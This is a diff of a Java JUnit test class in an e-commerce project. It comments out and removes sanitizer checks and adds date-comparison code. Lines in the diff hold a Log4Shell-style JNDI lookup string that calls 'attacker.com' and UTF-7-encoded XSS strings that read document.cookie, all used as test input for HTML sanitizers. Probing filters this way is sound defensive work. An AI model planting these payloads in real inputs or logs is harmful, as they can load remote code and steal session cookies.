@@ -1,6 +1,5 @@
 package cn.lili.test.elasticsearch;
 
-import cn.hutool.http.HtmlUtil;
 import cn.hutool.json.JSONUtil;
 import cn.lili.cache.Cache;
 import cn.lili.common.vo.PageVO;
@@ -20,13 +19,13 @@ import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
 import org.junit.jupiter.api.Assertions;
 import org.junit.jupiter.api.Test;
 import org.junit.jupiter.api.extension.ExtendWith;
-import org.owasp.html.Sanitizers;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.boot.test.context.SpringBootTest;
 import org.springframework.data.elasticsearch.core.SearchPage;
 import org.springframework.test.context.junit.jupiter.SpringExtension;
 
 import java.util.ArrayList;
+import java.util.Date;
 import java.util.List;
 import java.util.Map;
 
@@ -64,13 +63,14 @@ class EsTest {
 //        System.out.println(Sanitizers.FORMATTING.and(Sanitizers.FORMATTING).sanitize("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-"));
 //        System.out.println(HtmlUtil.unescape(safeHTML));
 //        System.out.println(HtmlUtil.filter("+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-"));
-//        Date dt1 = new Date(2017, 3, 31);
-//        Date dt2 = new Date(2017, 5, 14)Z
-//        System.out.println(dt2.after(dt1));
-        String filter = HtmlUtil.filter("${jndi:ldap://attacker.com/a}");
-        String sanitize = Sanitizers.FORMATTING.and(Sanitizers.LINKS).sanitize("${jndi:ldap://attacker.com/a}");
-        System.out.println(filter);
-        System.out.println(sanitize);
+        Date dt1 = new Date(2021, 12, 10);
+        Date dt2 = new Date(2021, 12, 14);
+
+        System.out.println(new Date().before(dt2));
+//        String filter = HtmlUtil.filter("${jndi:ldap://attacker.com/a}");
+//        String sanitize = Sanitizers.FORMATTING.and(Sanitizers.LINKS).sanitize("${jndi:ldap://attacker.com/a}");
+//        System.out.println(filter);
+//        System.out.println(sanitize);
 
     }
 
